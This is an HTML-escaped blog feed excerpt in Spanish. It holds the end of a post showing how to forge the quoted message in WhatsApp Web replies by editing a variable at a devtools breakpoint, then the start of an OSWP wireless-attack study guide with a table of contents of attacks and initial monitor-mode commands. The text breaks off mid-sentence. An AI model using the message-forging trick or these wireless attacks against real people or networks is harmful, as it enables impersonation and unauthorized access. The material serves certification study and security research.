&lt;p&gt;Escribiremos como respuesta lo que queramos, yo en este caso he escrito &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;No sé si conocerás el canal de S4vitar&lt;/code&gt;. Tras enviar el mensaje, veremos que alcanzamos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Breakpoint&lt;/code&gt; y que el mensaje no llega a enviarse:&lt;/p&gt;

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step6.jpg&quot; /&gt;
&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Si nos vamos a la pestaña &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Console&lt;/code&gt; dentro de la pestaña &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sources&lt;/code&gt;, veremos que en este preciso instante podemos desglosar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e&lt;/code&gt;, pudiendo así ver todos los atributos que hacen referencia a la conversación que estamos llevando a cabo:&lt;/p&gt;

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step7.jpg&quot; /&gt;
&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En este caso, muestro sólo una porción para no compartir información privilegiada.&lt;/p&gt;

&lt;p&gt;Ya en este punto, podremos manipular el mensaje de mención al que estamos respondiendo de la siguiente forma:&lt;/p&gt;

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step8.jpg&quot; /&gt;
&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Lo único que tendremos que hacer posteriormente es darle al &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Play&lt;/code&gt; para que el mensaje siga su flujo y salgamos del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Breakpoint&lt;/code&gt;:&lt;/p&gt;

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step9.jpg&quot; /&gt;
&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez hecho, podremos ver lo siguiente:&lt;/p&gt;

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step10.jpg&quot; /&gt;
&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Hemos falsificado el mensaje al cual hacemos mención, haciendo creer al destinatario que nos ha escrito ese mensaje cuando no es así.&lt;/p&gt;

&lt;p&gt;Todo esto desde WhatsApp web, y te preguntarás… ¿cómo se ve desde el móvil?, pues se vería exactamente igual:&lt;/p&gt;

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step11.jpg&quot; width=&quot;400&quot; /&gt;
&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Como veis, es un bug que a día de hoy se puede seguir explotando. De hecho, atendiendo a los atributos de la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e&lt;/code&gt;, podréis ver que en verdad las posibilidades son infinitas.&lt;/p&gt;

&lt;p&gt;Existen montón de valores que se pueden alterar, los cuales han llegado incluso a ocasionar Crasheos de la propia aplicación, como podréis ver en el siguiente artículo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://research.checkpoint.com/2019/breakingapp-whatsapp-crash-data-loss-bug/&quot;&gt;https://research.checkpoint.com/2019/breakingapp-whatsapp-crash-data-loss-bug/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Este último en concreto ha sido parcheado, sin embargo sólo en el ámbito grupal (grupos de WhatsApp), en el sentido de que ya no afecta a los componentes de un grupo, sino al propio emisor del mensaje especialmente diseñado:&lt;/p&gt;

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step12.jpg&quot; width=&quot;400&quot; /&gt;
&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;¡Dejo en vuestras manos la investigación para que encontréis cosas chulas!&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Research" /><category term="WhatsApp" /><category term="Manipulación" /><category term="Bug" /><summary type="html">En este artículo, os muestro cómo es posible manipular los mensajes de otras personas en WhatsApp, explotando para ello un bug que a día de hoy sigue funcionando.</summary></entry><entry><title type="html">Preparación OSWP</title><link href="http://localhost:4000/oswp-preparacion/" rel="alternate" type="text/html" title="Preparación OSWP" /><published>2020-02-04T00:00:00+01:00</published><updated>2020-02-04T00:00:00+01:00</updated><id>http://localhost:4000/oswp-preparacion</id><content type="html" xml:base="http://localhost:4000/oswp-preparacion/">&lt;h1 id=&quot;preparación-para-el-oswp-by-s4vitar&quot;&gt;Preparación para el OSWP (by s4vitar)&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;https://funkyimg.com/i/2VTJW.jpg&quot; alt=&quot;OSWP Image&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;offensive-security-wireless-attacks-wifu-course-and-offensive-security-wireless-professional-oswp-cheat-sheet&quot;&gt;Offensive Security Wireless Attacks (WiFu) course and Offensive Security Wireless Professional (OSWP) Cheat Sheet&lt;/h4&gt;

&lt;p&gt;&lt;br /&gt;
Esta guía es la misma que tengo publicada en mi Gist:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb&quot;&gt;https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;índice-y-estructura-principal&quot;&gt;Índice y Estructura Principal&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#Antecedentes&quot;&gt;Antecedentes - Experiencia Personal&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#estructura-de-los-apuntes&quot;&gt;Estructura de los apuntes&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#redes-wpa&quot;&gt;Redes WPA&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#conceptos-básicos&quot;&gt;Conceptos básicos&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#modo-monitor&quot;&gt;Modo monitor&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#configuración-de-la-tarjeta-de-red-y-tips&quot;&gt;Configuración de la tarjeta de red y tips&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#análisis-del-entorno&quot;&gt;Análisis del entorno&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#modos-de-filtro&quot;&gt;Modos de filtro&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#exportación-de-evidencias&quot;&gt;Exportación de evidencias&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#concepto-de-handshake&quot;&gt;Concepto de Handshake&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#técnicas-para-capturar-un-handshake&quot;&gt;Técnicas para capturar un Handshake&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#ataque-de-deautenticación-dirigido&quot;&gt;Ataque de Deautenticación dirigido&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#ataque-de-deautenticación-global&quot;&gt;Ataque de Deautenticación global (Broadcast MAC Address)&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#ataque-de-autenticación&quot;&gt;Ataque de Autenticación&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#cts-frame-attack&quot;&gt;CTS Frame Attack - Secuestro del Ancho de Banda&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#beacon-flood-mode-attack&quot;&gt;Beacon Flood Mode Attack&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#disassociation-amok-mode-attack&quot;&gt;Disassociation Amok Mode Attack&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#michael-shutdown-exploitation&quot;&gt;Michael Shutdown Exploitation&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#técnicas-pasivas&quot;&gt;Técnicas pasivas&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#validación-del-handshake-con-pyrit&quot;&gt;Validación del Handshake con Pyrit&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#tratamiento-y-filtro-de-la-captura&quot;&gt;Tratamiento y filtro de la captura&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#parseador-para-redes-del-entorno&quot;&gt;Parseador para redes del entorno&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#análisis-de-paquetes-de-red-con-tshark&quot;&gt;Análisis de paquetes de red con Tshark&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#extracción-del-hash-en-el-handshake&quot;&gt;Extracción del hash en el Handshake&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#fuerza-bruta-con-john&quot;&gt;Fuerza bruta con John&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#fuerza-bruta-con-aircrack&quot;&gt;Fuerza bruta con Aircrack&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#fuerza-bruta-con-hashcat&quot;&gt;Fuerza bruta con Hashcat&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#proceso-de-ataque-con-bettercap&quot;&gt;Proceso de ataque con Bettercap&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#técnicas-de-aumento-de-la-velocidad-de-cómputo&quot;&gt;Técnicas de aumento de la velocidad de cómputo&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#concepto-de-rainbow-table&quot;&gt;Concepto de Rainbow Table&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#cracking-con-pyrit&quot;&gt;Cracking con Pyrit&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#cracking-con-cowpatty&quot;&gt;Cracking con Cowpatty&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#cracking-con-airolib&quot;&gt;Cracking con Airolib&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#rainbow-table-con-genpmk&quot;&gt;Rainbow Table con GenPMK&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#cracking-con-cowpatty-frente-a-rainbow-table&quot;&gt;Cracking con Cowpatty frente a Rainbow Table&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#cracking-con-pyrit-frente-a-rainbow-table&quot;&gt;Cracking con Pyrit frente a Rainbow Table&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#cracking-con-pyrit-a-través-de-ataque-por-base-de-datos&quot;&gt;Cracking con Pyrit a través de ataque por base de datos&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#técnicas-de-espionaje&quot;&gt;Técnicas de espionaje&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#uso-de-airdecap-para-el-desencriptado-de-paquetes&quot;&gt;Uso de Airdecap para el desencriptado de paquetes&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#análisis-del-desencriptado-con-tshark-y-wireshark&quot;&gt;Análisis del desencriptado con Tshark y Wireshark&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#espionaje-con-ettercap-driftnet-y-enrutamiento-con-iptables&quot;&gt;Espionaje con Ettercap Driftnet y enrutamiento con iptables&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#ataques-graciosos&quot;&gt;Ataques graciosos&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#reemplazado-de-imágenes-web&quot;&gt;Reemplazado de imágenes web&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#ataque-shaking-web&quot;&gt;Ataque Shaking Web&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#evil-twin-attack&quot;&gt;Evil Twin Attack&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#creación-de-fichero-dhcp&quot;&gt;Creación de fichero DHCP&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#configuración-de-página-web&quot;&gt;Configuración de página web&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#inicialización-de-servicios&quot;&gt;Inicialización de servicios&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#creación-de-base-de-datos-via-mysql&quot;&gt;Creación de base de datos via MYSQL&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#creación-de-falso-punto-de-acceso-via-airbase&quot;&gt;Creación de falso punto de acceso via Airbase&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#cración-de-interfaz-y-asignación-de-segmentos&quot;&gt;Creación de interfaz y asignación de segmentos&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#control-y-creación-de-reglas-de-enrutamiento-por-iptables&quot;&gt;Control y creación de reglas de enrutamiento por iptables&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#sincronización-de-reglas-definidas-con-el-fake-ap&quot;&gt;Sincronización de reglas definidas con el Fake AP&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#robo-de-datos&quot;&gt;Robo de datos&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#ataque-a-redes-sin-clientes&quot;&gt;Ataque a redes sin clientes&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#clientless-pkmid-attack&quot;&gt;Clientless PKMID Attack&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;#ataque-desde-bettercap&quot;&gt;Ataque desde Bettercap&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#ataque-via-hcxdumptool&quot;&gt;Ataque via hcxdumptool&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#uso-de-hcxpcaptool&quot;&gt;Uso de hcxpcaptool&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#ataques-por-wps&quot;&gt;Ataques por WPS&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#uso-de-wifimosys&quot;&gt;Uso de Wifimosys&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#redes-wpa-ocultas&quot;&gt;Redes WPA Ocultas&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#redes-wep&quot;&gt;Redes WEP&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#fake-authentication-attack&quot;&gt;Fake Authentication Attack&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#arp-replay-attack&quot;&gt;ARP Replay Attack&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#chop-chop-attack&quot;&gt;Chop Chop Attack&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#fragmentation-attack&quot;&gt;Fragmentation Attack&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#ska-type-cracking&quot;&gt;SKA Type Cracking&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;antecedentes&quot;&gt;Antecedentes&lt;/h1&gt;
&lt;p&gt;Antes que nada me gustaría comentar un poco mi experiencia a la hora de abordar el curso, pues tal vez le
sirva de inspiración para aquel que pretenda sacarse la certificación.&lt;/p&gt;

&lt;h4 id=&quot;es-difícil-la-certificación&quot;&gt;¿Es difícil la certificación?&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://funkyimg.com/i/2VTgJ.jpeg&quot; alt=&quot;Certificado Físico&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A diferencia del OSCP, encontré bastante sencillo el curso, pero todo tiene su explicación.&lt;/p&gt;

&lt;p&gt;Cuando empecé con el Hacking, lo primero que toqué fue la parte WiFi, por lo que esta parte la tenía más que
controlada antes de empezar. En cuanto a aprendizaje, aprendí una o dos cosas nuevas, lo cual es
excitante, pero a groso modo os puedo decir que por mi cuenta de manera autodidacta abarqué mucho más temario
del que presentaba el curso.&lt;/p&gt;

&lt;p&gt;Por ello hago este Gist, no sólo para comentar las técnicas que necesitáis tener controladas, sino para
enseñaros un par de trucos y vectores de ataque que no están de más guardarlos bajo la manga.&lt;/p&gt;

&lt;h4 id=&quot;qué-plan-me-pillo&quot;&gt;¿Qué plan me pillo?&lt;/h4&gt;

&lt;p&gt;En mi caso me pillé un mes de curso, pero al tercer día de pagarlo me presenté al examen. Para aquellos que no
estén experimentados con la temática WiFi, os puedo decir que con un mes tenéis de sobra, ya que no requiere
tanta dedicación como el OSCP.&lt;/p&gt;

&lt;p&gt;Eso sí, hay multitud de comandos y distintos casos, por lo que sobra decir que practicar siempre hay que
practicar.&lt;/p&gt;

&lt;p&gt;En este caso el curso no dispone de laboratorio, por lo que será necesario montarse un laboratorio
en local donde practicar los distintos casos. Para los interesados, todos los laboratorios los monté con un
‘&lt;strong&gt;TP-Link&lt;/strong&gt;’, un simple repetidor desde el cual podía configurar si la red quería que fuera de protocolo WPA
o de protocolo WEP con sus distintos modos de autenticación.&lt;/p&gt;

&lt;h4 id=&quot;qué-bases-tuve-antes-de-comenzar-con-la-certificación&quot;&gt;¿Qué bases tuve antes de comenzar con la certificación?&lt;/h4&gt;

&lt;p&gt;Como dije anteriormente, tenía altamente controlada la parte WiFi, por lo que el estudio de los ataques a
redes WPA y WEP no supuso ningún problema. La guía que te entregan junto a los vídeos están perfectamente
estructurados, y cuentas con todo lo necesario para enfrentarte al examen.&lt;/p&gt;

&lt;h4 id=&quot;qué-pasos-me-recomiendas-para-abordar-con-éxito-la-certificación&quot;&gt;¿Qué pasos me recomiendas para abordar con éxito la certificación?&lt;/h4&gt;

&lt;p&gt;Recomiendo montar un laboratorio en local para practicar todos los vectores de ataque vistos durante el curso.&lt;/p&gt;

&lt;p&gt;Para abordar con éxito la certificación, es necesario que sepas al dedillo cómo manejarte en las siguientes
situaciones, siguiendo como objetivo obtener la contraseña del punto de acceso inalámbrico:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Ataques a redes WPA con autenticación PSK&lt;/li&gt;
  &lt;li&gt;Ataques a redes WEP con clientes sin autenticación SKA&lt;/li&gt;
  &lt;li&gt;Ataques a redes WEP con clientes y autenticación SKA&lt;/li&gt;
  &lt;li&gt;Ataques a redes WEP sin clientes&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ahora bien, para cada caso, hay distintas formas de efectuar el procedimiento, ya que depende a su vez del
tráfico de la red, la calidad de los paquetes capturados y distintos factores.&lt;/p&gt;

&lt;h4 id=&quot;cómo-está-estructurado-el-examen&quot;&gt;¿Cómo está estructurado el examen?&lt;/h4&gt;

&lt;p&gt;El examen tiene una duración de cuatro horas, te conectas a una máquina por VPN la cual dispone de una tarjeta
de red configurada y a partir de ahí escaneas el entorno.&lt;/p&gt;

&lt;p&gt;En el entorno, hay un total de tres puntos de acceso que debes vulnerar, cada uno de ellos representando un
caso diferente. Para aprobar el examen, debes averiguar la contraseña de los tres AP’s, pues en caso contrario
no te aprueban.&lt;/p&gt;

&lt;p&gt;La gran pregunta, ¿son cuatro horas suficientes?, mi respuesta es más que suficiente. En mi caso en una media
hora aproximada ya había terminado el examen (lo cual me sorprendió). Recomiendo tener todos los comandos
apuntados para cada caso, eso os permitirá ir a tiro hecho.&lt;/p&gt;

&lt;h4 id=&quot;tuve-problemas-a-la-hora-de-practicar-con-el-laboratorio-en-local&quot;&gt;¿Tuve problemas a la hora de practicar con el laboratorio en local?&lt;/h4&gt;

&lt;p&gt;Como dije anteriormente, esta certificación no dispone de laboratorio, lo que te obliga a montarte tu propio
laboratorio en local para practicar.&lt;/p&gt;

&lt;p&gt;Los únicos ataques que no pude replicar fueron el &lt;strong&gt;Chop Chop de Korek&lt;/strong&gt; y el &lt;strong&gt;Fragmentation Attack&lt;/strong&gt;,
empleado para redes que no disponen de clientes asociados. Este mismo problema lo he visto en más gente,
leyendo en artículos donde detallaban el mismo inconveniente. Al parecer depende del modelo de router que
tengas.&lt;/p&gt;

&lt;p&gt;En la web de Offensive se cita el modelo a usar para practicar los vectores de ataque, pero como
comprenderéis, no iba a gastar dinero por poder hacer dos ataques. Por lo demás, el resto de ataque los pude
replicar correctamente.&lt;/p&gt;

&lt;h4 id=&quot;cuáles-son-los-siguientes-pasos&quot;&gt;¿Cuáles son los siguientes pasos?&lt;/h4&gt;

&lt;p&gt;La siguiente certificación que me estoy preparando es el &lt;strong&gt;eWPT&lt;/strong&gt;, una certificación de Pentesting Web
bastante valorada y orientada a Bug Bounty. Si me animo puede que mate dos pájaros de un tiro y tras tenerla
pruebe a hacer el &lt;strong&gt;AWAE&lt;/strong&gt; de Offensive Security, ya que estaré bien fresco de ideas una vez finalice el otro.&lt;/p&gt;

&lt;p&gt;Por si os interesa, el &lt;strong&gt;eWPT&lt;/strong&gt; dispone de un plan (que es el que he pagado) que os permite tener un
laboratorio de máquinas de por vida sobre los que practicar Pentesting Web, el cual os actualizan
frecuentemente.&lt;/p&gt;

&lt;h1 id=&quot;estructura-de-los-apuntes&quot;&gt;Estructura de los apuntes&lt;/h1&gt;

&lt;p&gt;Para facilitar la repartición de apuntes, intuyo que es buena idea dividirlo por un lado en ataques a redes
WPA y por otro lado en ataques a redes WEP con sus distintos casos, ¡así que así lo haremos Mike!&lt;/p&gt;

&lt;h2 id=&quot;redes-wpa&quot;&gt;Redes WPA&lt;/h2&gt;
&lt;p&gt;Este apartado engloba todos los vectores de ataque y técnicas ofensivas destinadas al protocolo WPA.&lt;/p&gt;

&lt;h3 id=&quot;conceptos-básicos&quot;&gt;Conceptos básicos&lt;/h3&gt;

&lt;p&gt;Hay que aclarar una serie de conceptos clave antes de empezar. La mayoría de los ataques que vamos a ver,
además de en ocasiones servir para molestar… van destinados a obtener la contraseña de una red inalámbrica.&lt;/p&gt;

&lt;p&gt;El por qué es necesario realizar un ataque para obtener la contraseña es algo que veremos en los siguientes
puntos. Hay que tener en cuenta que al tratarse de una autenticación de tipo PSK (Pre-Shared-Key), se está
haciendo uso de una clave pre-compartida como su nombre indica, una contraseña única que de estar a
disposición de cualquiera puede ser usada para llevar a cabo una asociación contra el AP.&lt;/p&gt;

&lt;p&gt;A la hora de llevar a cabo una asociación por una estación (&lt;strong&gt;cliente&lt;/strong&gt;) contra el AP, se deja un rastro a
nivel de paquetes (eapol), los cuales como atacante, pueden ser capturados y tratados sin estar autenticados
al punto de acceso para posteriormente extraer la contraseña de la red inalámbrica.&lt;/p&gt;

&lt;p&gt;Todo esto explicado de una manera no técnica para no entrar en materia tan rápido, ya a medida que vayamos
avanzando se irá analizando mas a bajo nivel cómo funciona todo :)&lt;/p&gt;

&lt;h3 id=&quot;modo-monitor&quot;&gt;Modo monitor&lt;/h3&gt;

&lt;p&gt;Hay que pensar que estamos rodeados de paquetes por todos lados, paquetes que no somos capaces de percibir,
paquetes que contienen información del entorno por el que nos movemos.&lt;/p&gt;

&lt;p&gt;Estos paquetes pueden ser capturados con tarjetas de red que acepten el modo monitor. El &lt;strong&gt;modo monitor&lt;/strong&gt;, no
es más que un modo por el cual podemos escuchar y capturar todos los paquetes que viajen por el aire. Tal vez
lo mejor de todo es que no sólo podemos capturarlos, sino también manipularlos (veremos algunos ataques
interesantes más adelante).&lt;/p&gt;

&lt;p&gt;Para comprobar si nuestra tarjeta de red acepta el modo monitor, haremos una prueba en el siguiente apartado.&lt;/p&gt;

&lt;h3 id=&quot;configuración-de-la-tarjeta-de-red-y-tips&quot;&gt;Configuración de la tarjeta de red y tips&lt;/h3&gt;

&lt;p&gt;Empecemos con un par de comandos básicos. A continuación os listo mi tarjeta de red:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#ifconfig wlan0&lt;/span&gt;
wlan0: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
        inet 192.168.1.187  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::1d28:6b2b:a941:5796  prefixlen 64  scopeid 0x20&amp;lt;&lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
        ether e4:70:b8:d3:93:5d  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX packets 6426576  bytes 9229384163 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8.5 GiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX errors 0  dropped 5  overruns 0  frame 0
        TX packets 1160899  bytes 162727829 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;155.1 MiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Espero que a partir de ahora os llevéis bien con ella, pues con esta practicaremos la mayoría de ataques.&lt;/p&gt;

&lt;p&gt;Para poner en modo monitor nuestra tarjeta de red, es tan simple como aplicar el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#airmon-ng start wlan0&lt;/span&gt;

Found 5 processes that could cause trouble.
Kill them using &lt;span class=&quot;s1&quot;&gt;'airmon-ng check kill'&lt;/span&gt; before putting
the card &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;monitor mode, they will interfere by changing channels
and sometimes putting the interface back &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;managed mode

  PID Name
  818 avahi-daemon
  835 wpa_supplicant
  877 avahi-daemon
 5398 NetworkManager
18308 dhclient

PHY	Interface	Driver		Chipset

phy0	wlan0		iwlwifi		Intel Corporation Wireless 7265 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rev 61&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

		&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mac80211 monitor mode vif enabled &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;phy0]wlan0 on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;phy0]wlan0mon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mac80211 station mode vif disabled &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;phy0]wlan0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora bien, cosas a tener en cuenta. Cuando estamos en modo monitor, perdemos conectividad a internet. Este
modo no admite conexión a internet, por lo que no os asustéis si de pronto veis que no podéis navegar. Veremos
cómo deshabilitar este modo para que todo vuelva a la normalidad.&lt;/p&gt;

&lt;p&gt;Cabe decir que al iniciar este modo, se generan una serie de &lt;strong&gt;procesos conflictivos&lt;/strong&gt;. Esto es así dado que
por ejemplo, si no vamos a tener acceso a internet… ¿por qué tener corriendo los procesos ‘&lt;strong&gt;dhclient&lt;/strong&gt;’ y
